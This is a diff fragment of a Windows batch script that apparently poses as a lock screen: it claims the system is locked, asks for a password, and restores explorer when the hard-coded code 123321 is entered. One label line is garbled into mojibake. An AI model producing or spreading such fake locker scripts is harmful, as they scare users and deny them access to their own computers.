@@ -6,9 +6,9 @@ color a
 echo Your Windows OC is locked
 echo Enter Password:
 
-:ð
+:Ã°
 set /p x=
-if %x%==123321 (echo Windows OC inlocked
+if %x%==123321 (echo Windows OC unlocked
 start explorer
 exit
 ) else (
